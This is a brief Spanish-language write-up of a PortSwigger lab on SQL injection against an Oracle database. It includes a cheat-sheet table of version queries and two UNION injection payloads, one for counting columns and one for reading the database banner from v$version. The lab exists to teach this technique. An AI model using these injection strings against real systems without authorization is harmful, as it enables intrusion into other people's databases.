# 5 - Querying the database type and version on Oracle

> This lab contains an [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
>
>  To solve the lab, display the database version string.

Si vemos el [cheatsheet ](https://portswigger.net/web-security/sql-injection/cheat-sheet)nos muestra como obtener la version 

|  |  |
| :--- | :--- |
| Oracle | `SELECT banner FROM v$version SELECT version FROM v$instance` |
|  Microsoft |  `SELECT @@version` |
|  PostgreSQL |  `SELECT version()` |
|  MySQL |  `SELECT @@version` |

Hay que ver que tantas columnas esta retornando:

 `'+UNION+SELECT+'abc','def'+FROM+dual--`

**Luego** 

```text
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```

